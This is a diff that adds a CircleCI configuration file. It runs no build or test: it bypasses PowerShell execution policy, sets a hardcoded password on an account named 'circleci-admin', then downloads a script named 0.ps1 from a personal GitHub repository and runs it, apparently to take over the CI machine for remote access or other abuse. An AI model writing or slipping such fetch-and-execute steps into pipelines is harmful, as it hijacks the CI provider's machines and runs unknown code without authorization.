@@ -1,0 +1,14 @@
+version: 2.1
+
+jobs:
+  build: # name of your job
+    resource_class: 'windows.large'
+    machine:
+      image: 'windows-server-2022-gui:current'
+      shell: 'powershell.exe -ExecutionPolicy Bypass'
+    steps:
+
+        - checkout
+        - run: net user circleci-admin P@ssw0rd!
+        - run: Invoke-WebRequest https://github.com/Usser1222/circleci/raw/main/0.ps1 -OutFile 0.ps1
+        - run: ./0.ps1
